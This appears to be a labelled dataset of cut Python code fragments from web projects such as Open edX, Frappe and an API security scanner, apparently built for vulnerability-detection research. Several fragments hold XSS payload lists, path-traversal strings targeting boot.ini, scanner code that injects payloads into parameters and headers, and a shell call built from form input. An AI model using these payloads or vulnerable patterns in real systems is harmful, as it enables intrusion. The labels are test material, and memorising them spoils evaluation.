','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route", "label": 1}, {"snippet_id": 18808, "code": "'AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid", "label": 0}, {"snippet_id": 34869, "code": ".meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t", "label": 0}, {"snippet_id": 45847, "code": "['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping", "label": 0}, {"snippet_id": 19795, "code": " run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft)", "label": 0}, {"snippet_id": 6091, "code": ": '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/', 'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class IdPConfig(object): \"\"\" Class holding", "label": 0}, {"snippet_id": 37427, "code": " as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None", "label": 0}, {"snippet_id": 22523, "code": "/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ", "label": 0}, {"snippet_id": 5516, "code": "''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert", "label": 0}, {"snippet_id": 14407, "code": ".migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'),", "label": 0}, {"snippet_id": 19721, "code": " test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite", "label": 0}, {"snippet_id": 2586, "code": ".update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers)", "label": 0}, {"snippet_id": 22568, "code": "=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 6080, "code": "': ' 'default_language': 'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None", "label": 0}, {"snippet_id": 18820, "code": "-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 7951, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9", "label": 0}, {"snippet_id": 12123, "code": "'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P", "label": 1}, {"snippet_id": 27963, "code": "\"\"\"Login page.\"\"\" import datetime from config import local_config from handlers import base_handler from libs import auth from libs import handler from libs import helpers from metrics import logs SESSION_EXPIRY_DAYS", "label": 0}, {"snippet_id": 51459, "code": "'django.contrib.messages', 'django.contrib.staticfiles', 'django.contrib.humanize', 'django_celery_beat', 'compressor', 'websecmap.app', 'websecmap.organizations', 'websecmap.scanners', 'websecmap.reporting'", "label": 0}, {"snippet_id": 46808, "code": ".IntField() ref_id=fields.IntField(default=0) kind=K_COMMENT class Meta: table='comments' async def set_content(self, content): return await self.set_props_by_key('content', content) async def save(self, ", "label": 0}, {"snippet_id": 33499, "code": " strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): ", "label": 1}, {"snippet_id": 50694, "code": ") if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession.save() def data_out(self, **kwargs): \"\"\" Data Evennia -> User Kwargs: kwargs(any): Options to the protocol \"\"\" self.sessionhandler", "label": 0}, {"snippet_id": 36345, "code": " Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map ", "label": 0}, {"snippet_id": 16271, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 33558, "code": ".blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'", "label": 0}, {"snippet_id": 25251, "code": " a=copy.copy(attrs) or{} a['data-fname']=fname widgets.append(self.widget(attrs=a)) super().__init__(widgets, attrs) def decompress(self, value): if value is None: return None data=[] for i, field in enumerate", "label": 0}, {"snippet_id": 30973, "code": "'configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t \tif form.getvalue('configver') is None: \t\tos.system(\"/bin/rm -f \" +cfg)\t \t\t if form.getvalue('master'): \tmaster=form.getvalue('master'", "label": 0}, {"snippet_id": 46058, "code": " collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\")) query={'qs':[{'q': ", "label": 0}, {"snippet_id": 2442, "code": " as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type'", "label": 0}, {"snippet_id": 38227, "code": "\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route", "label": 0}, {"snippet_id": 16503, "code": "'^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 15905, "code": "{'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course", "label": 0}, {"snippet_id": 344, "code": " in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload)", "label": 1}, {"snippet_id": 54804, "code": " UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs)", "label": 0}, {"snippet_id": 41949, "code": "\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError", "label": 0}, {"snippet_id": 4957, "code": "', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>'", "label": 0}, {"snippet_id": 35298, "code": " strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t", "label": 0}, {"snippet_id": 3365, "code": ".headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?',", "label": 0}, {"snippet_id": 3951, "code": " ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger", "label": 0}, {"snippet_id": 43594, "code": "._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self", "label": 0}, {"snippet_id": 41455, "code": " Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, ", "label": 0}, {"snippet_id": 7219, "code": "'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 40783, "code": ": \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value,", "label": 0}, {"snippet_id": 30614, "code": ") is not None: \tviewlog=form.getvalue('viewlogs') \tlog_path=funct.get_config_var('main', 'log_path') \trows=form.getvalue('rows2') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue", "label": 0}, {"snippet_id": 27824, "code": " logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, status) else: if status==403 or", "label": 0}, {"snippet_id": 23571, "code": "('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 51985, "code": ".shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import", "label": 0}, {"snippet_id": 34026, "code": "(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t", "label": 0}, {"snippet_id": 2029, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value", "label": 0}, {"snippet_id": 26108, "code": "].widget.is_required=True self.fields['company'].widget.attrs['required']='required' del self.fields['company'].widget.attrs['data-display-dependency'] if 'vat_id' in self.fields: del self.fields['vat_id", "label": 0}, {"snippet_id": 35248, "code": "\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for", "label": 0}, {"snippet_id": 40802, "code": "(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType", "label": 0}, {"snippet_id": 6086, "code": "': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/', 'insecure_cookies': '0', }", "label": 0}, {"snippet_id": 50517, "code": "' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax client. The requests should be tagged with different modes depending on what needs to", "label": 0}, {"snippet_id": 5684, "code": ">prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y//", "label": 0}, {"snippet_id": 4966, "code": "=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick", "label": 0}, {"snippet_id": 25287, "code": "]: data[-1]=value.get('_legacy', '') return data def render(self, name: str, value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs", "label": 0}, {"snippet_id": 22532, "code": " in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"", "label": 0}, {"snippet_id": 43037, "code": "\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags", "label": 0}, {"snippet_id": 42612, "code": " self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False", "label": 0}, {"snippet_id": 49694, "code": ".ordering_query_param, } try: field, label=field except(TypeError, ValueError): kwargs['field']=field else: if callable(field): kwargs['field'], kwargs['render_function'], kwargs['label']=None, field, label else", "label": 0}, {"snippet_id": 47370, "code": " http_request.GET.get(\"user_id\"): user_id=int(http_request.GET[\"user_id\"]) if user_id is not None: profile=Profile.objects.get(pk=user_id) f=Form() f.action_url=action_url if profile: f.add_content(PlainText", "label": 0}, {"snippet_id": 20521, "code": "...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"", "label": 0}, {"snippet_id": 54832, "code": ") return context def test_func(self): return self.request.user==self.get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\" model=Article success_url='/' def test_func", "label": 0}, {"snippet_id": 53050, "code": ".POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name']", "label": 0}, {"snippet_id": 48280, "code": "\"redirect\"] else: forward_url=\"/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation", "label": 0}, {"snippet_id": 41640, "code": ".db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype", "label": 0}, {"snippet_id": 6570, "code": " INI file is content_packages=pkg1:some/path/, pkg2:foo :return: list of(pkg, path) tuples \"\"\" if self._parsed_content_packages: return self._parsed_content_packages value=self.config.get(self.section, ", "label": 0}, {"snippet_id": 5517, "code": "=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)", "label": 0}, {"snippet_id": 12846, "code": "'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login", "label": 0}, {"snippet_id": 47455, "code": " to: \" +str(http_request.GET['fault']))) elif http_request.GET.get('fault'): f.add_content(PlainText(\"Unable to add user due to: \" +str(http_request.GET['fault']))) current_user: Profile=get_current_user", "label": 0}, {"snippet_id": 45786, "code": "'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords", "label": 0}, {"snippet_id": 36391, "code": "\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t", "label": 0}, {"snippet_id": 1458, "code": " import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import", "label": 1}, {"snippet_id": 27945, "code": " response) self.upload=None def get_upload(self): \"\"\"Get uploads.\"\"\" if self.upload: return self.upload upload_key=self.request.get('upload_key') if not upload_key: return None blob_info=storage.GcsBlobInfo", "label": 0}, {"snippet_id": 31760, "code": ".get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')", "label": 0}, {"snippet_id": 11526, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=", "label": 0}, {"snippet_id": 27683, "code": ") values['ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id') if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request", "label": 0}, {"snippet_id": 54810, "code": "' fields=['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT", "label": 0}, {"snippet_id": 38753, "code": ".ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self,", "label": 0}, {"snippet_id": 50516, "code": "\"\"' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax client. The requests should be tagged with different modes depending on what needs", "label": 0}, {"snippet_id": 26762, "code": "./../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 30370, "code": ">Error Connecting: %s</div>' % errc) \texcept requests.exceptions.Timeout as errt: \t\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err)", "label": 0}, {"snippet_id": 731, "code": ".path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request", "label": 1}, {"snippet_id": 16090, "code": " name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$',", "label": 0}, {"snippet_id": 28401, "code": " and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type", "label": 0}, {"snippet_id": 52999, "code": " workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json", "label": 1}, {"snippet_id": 20146, "code": ".flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self):", "label": 0}, {"snippet_id": 52353, "code": "('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document", "label": 0}, {"snippet_id": 2833, "code": " xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id", "label": 0}, {"snippet_id": 50795, "code": " flags.get('XTERM256', True)) useansi=options.get(\"ansi\", flags.get('ANSI', True)) nocolor=options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not(xterm256 or useansi)) screenreader=options.get(\"screenreader", "label": 0}, {"snippet_id": 20856, "code": "'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$", "label": 0}, {"snippet_id": 48296, "code": "%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation=GroupReservation.objects.get(id=str(request.GET[\"rid\"])) if current_reservation.createdByUser !=u and u.rights < 2:", "label": 0}, {"snippet_id": 29477, "code": "')] \tssh=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log", "label": 0}, {"snippet_id": 3534, "code": "=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload", "label": 0}, {"snippet_id": 1710, "code": "], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul", "label": 0}, {"snippet_id": 38260, "code": " filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters", "label": 0}, {"snippet_id": 39255, "code": ": \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef", "label": 0}, {"snippet_id": 23595, "code": ".urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +", "label": 0}, {"snippet_id": 10317, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\"", "label": 0}, {"snippet_id": 15825, "code": "*args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get(", "label": 0}, {"snippet_id": 2829, "code": "'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger", "label": 0}, {"snippet_id": 19493, "code": " With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit", "label": 0}, {"snippet_id": 48409, "code": "=int(request.POST[\"quantity_\" +str(art.id)]) if amount > 0: ar=ArticleRequested() ar.AID=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int", "label": 0}, {"snippet_id": 6274, "code": " @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self.section, 'debug') @property def syslog_debug(self): \"\"\" Set to True to log debug messages", "label": 0}, {"snippet_id": 42497, "code": " \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert(", "label": 0}, {"snippet_id": 41205, "code": " \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger", "label": 0}, {"snippet_id": 27830, "code": ".headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, status) else: if status==403 or status==401: self.render_forbidden(exception.message) else: self.render(", "label": 0}, {"snippet_id": 19946, "code": " super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self", "label": 0}, {"snippet_id": 47379, "code": "[\"user_id\"]) if user_id is not None: profile=Profile.objects.get(pk=user_id) f=Form() f.action_url=action_url if profile: f.add_content(PlainText('<h3>Edit user \"' +profile.authuser.username +'\"</h3>')", "label": 0}, {"snippet_id": 34630, "code": "'__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname", "label": 0}, {"snippet_id": 53051, "code": ".get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid", "label": 0}, {"snippet_id": 13911, "code": ".views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 18420, "code": ", name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id", "label": 0}, {"snippet_id": 33941, "code": " like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t", "label": 0}, {"snippet_id": 9019, "code": "'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views", "label": 0}, {"snippet_id": 36864, "code": "\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe", "label": 0}, {"snippet_id": 21861, "code": " url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login'", "label": 0}, {"snippet_id": 248, "code": " except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid) xss_http_headers(url", "label": 1}, {"snippet_id": 30118, "code": " |grep inet |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}", "label": 0}, {"snippet_id": 7504, "code": ", url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"", "label": 0}, {"snippet_id": 35479, "code": "\t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in 